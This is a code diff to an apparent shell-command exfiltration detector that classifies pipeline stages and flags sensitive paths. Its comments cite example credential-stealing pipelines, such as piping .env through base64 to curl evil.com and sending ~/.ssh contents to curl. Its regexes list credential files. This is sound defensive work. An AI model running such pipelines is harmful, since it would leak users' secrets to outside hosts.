@@ -1,3 +1,5 @@
+import { unwrapCommandHead, FS_READ_TOOLS } from '../shell/index';
+
 // Pipe-chain exfiltration detector.
 // Classifies the stages of a shell pipeline as source / transform / sink and
 // computes a risk level. Without this, `cat .env | base64 | curl evil.com`
@@ -14,21 +16,10 @@ export interface PipeChainAnalysis {
 }
 
 // Commands that read files and pass their content downstream
-const SOURCE_COMMANDS = new Set([
-  'cat',
-  'head',
-  'tail',
-  'grep',
-  'awk',
-  'sed',
-  'cut',
-  'sort',
-  'tee',
-  'less',
-  'more',
-  'strings',
-  'xxd',
-]);
+// DERIVED from the jail's reader set, never hand-written beside it. The hand
+// copy had drifted 23 verbs behind (BUGS.md JAIL-6): `rg key | curl` scored a
+// tier below `cat key | curl`. `tee` is added because it copies what it reads.
+const SOURCE_COMMANDS = new Set<string>([...FS_READ_TOOLS, 'tee']);
 
 // Commands that send data to a remote host
 const SINK_COMMANDS = new Set([
@@ -65,11 +56,20 @@ const OBFUSCATORS = new Set([
 
 // File path patterns that indicate credentials or sensitive data
 const SENSITIVE_PATTERNS = [
-  /(?:^|\/)\.env(?:\.|$)/i, // .env, .env.local, .env.production
+  // Kept in step with the AST tier and dlp/ -- see jail-both-doors.test.ts.
+  /(?:^|\/)\.env(?![\w-])(?:[\w.-]*\.local$|(?!\.(?:example|sample|template)\b)(?!\.test$)[\w.-]*$)/i, // .env chain; fixtures exempt unless .local
   /id_rsa|id_ed25519|id_ecdsa|id_dsa/i, // SSH private keys
   /\.pem$|\.key$|\.p12$|\.pfx$/i, // certificate files
-  /(?:^|\/)\.ssh\//i, // ~/.ssh/ directory
-  /(?:^|\/)\.aws\/credentials/i, // AWS credentials
+  // The `$` half mirrors shell/index.ts's SENSITIVE_PATH_RULES: a file INSIDE
+  // the directory counts wherever it appears, while the directory ITSELF counts
+  // only when the path is ROOTED (`~/.ssh`, `/home/u/.ssh`) -- an unrooted
+  // `config/.ssh` is more likely a search pattern than a read. These are
+  // extracted TOKENS (see `args.some(isSensitivePath)` below), the same input
+  // contract as the shell tier, so the same boundary is the right one.
+  // Without it `grep -r x ~/.ssh | curl -d @-` scored one tier BELOW the
+  // identical pipeline naming a file inside that directory.
+  /(?:^|\/)\.ssh\/|^(?:[~/]|[A-Za-z]:).*\/\.ssh$/i, // ~/.ssh/ and ~/.ssh
+  /(?:^|\/)\.aws\/credentials|^(?:[~/]|[A-Za-z]:).*\/\.aws$/i, // AWS creds + dir
   /(?:^|\/)\.netrc$/i, // netrc (stores HTTP credentials)
   /(?:^|\/)(passwd|shadow|sudoers)$/i, // /etc/passwd, /etc/shadow
   /(?:^|\/)credentials(?:\.json)?$/i, // generic credentials files
@@ -118,9 +118,8 @@ export function splitOnPipe(cmd: string): string[] {
 }
 
 /** Extract non-flag tokens from a whitespace-split segment. */
-function positionalTokens(segment: string): string[] {
-  return segment
-    .split(/\s+/)
+function positionalTokens(tokens: string[]): string[] {
+  return tokens
     .slice(1) // skip binary name
     .filter((t) => !t.startsWith('-') && !t.startsWith('@') && t.length > 0);
 }
@@ -155,8 +154,17 @@ export function analyzePipeChain(command: string): PipeChainAnalysis {
   for (const segment of segments) {
     const tokens = segment.split(/\s+/).filter(Boolean);
     if (tokens.length === 0) continue;
-    const binary = tokens[0].toLowerCase();
-    const args = positionalTokens(segment);
+    // Stage 2 reachability (2026-09-11): a wrapped segment is judged by its real
+    // command head -- the jail's own helper, so the two cannot drift.
+    // A segment that is ONLY wrappers (`env | grep PATH`) unwraps past its end;
+    // fall back to the first token so `env` is judged as the command it is.
+    // A segment that is ONLY wrappers (`env | grep PATH`, `sudo -u bob | curl`)
+    // unwraps past its end; fall back to the FIRST token so the wrapper is judged
+    // as the command it is. `Math.min` looked right and picked the LAST token.
+    const h = unwrapCommandHead(tokens);
+    const head = h < tokens.length ? h : 0;
+    const binary = tokens[head].toLowerCase();
+    const args = positionalTokens(tokens.slice(head));
 
     if (SOURCE_COMMANDS.has(binary)) {
       sourceFiles.push(...args);
